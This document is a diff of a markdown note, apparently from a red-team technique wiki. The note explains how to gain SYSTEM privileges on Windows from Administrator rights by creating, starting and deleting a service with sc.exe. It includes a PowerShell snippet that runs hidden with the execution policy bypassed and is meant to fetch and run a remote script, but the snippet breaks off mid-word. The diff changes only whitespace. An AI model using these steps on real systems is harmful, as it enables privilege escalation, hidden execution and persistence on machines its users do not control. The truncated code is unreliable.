@@ -34,14 +34,28 @@ Create a Windows service which executes a script as SYSTEM when started. This pr
 
 Create a Windows service which executes a script as SYSTEM when started. This procedure does not create a standard Windows service - it uses a simple "hack" which executes a target script or program and will generate error messages since it's not launching a traditional service. The error messages do not mean the command failed to execute. This is especially useful when attempting to gain SYSTEM privileges after already gaining Administrator rights.
 
+
+
 # Instructions
 
 This procedure can execute a program or script. For example, a script that executes a PowerShell command to download and run a script from a remote server
 
+
+
+
+
 **Code**: [[@ECHO OFF
 powershell -ep bypass -windowstyle hidde]]
 
+
+
+
+
 1. Create a service with the path of the script/program as an argument
+
+
+
+
 
 **Command** ([[Create a Windows Service]]):
 
@@ -49,7 +63,15 @@ powershell -ep bypass -windowstyle hidde]]
 sc.exe create $_SERVICE_NAME binpath= "$_PATH\$_PROGRAM"
 ```
 
+
+
+
+
 2. Run the service
+
+
+
+
 
 **Command** ([[Start a Windows Service]]):
 
@@ -57,13 +79,25 @@ sc.exe create $_SERVICE_NAME binpath= "$_PATH\$_PROGRAM"
 sc.exe start $_SERVICE_NAME
 ```
 
+
+
+
+
 3. (Optional) Clean up by deleting the service when done
+
+
+
+
 
 **Command** ([[Delete a Windows Service]]):
 
 ```bash
 sc.exe delete $_SERVICE_NAME
 ```
+
+
+
+
 
 ## Platforms
 
@@ -90,3 +124,5 @@ sc.exe delete $_SERVICE_NAME
 
 - [[administrator]]
 - [[persistence]]
+
+
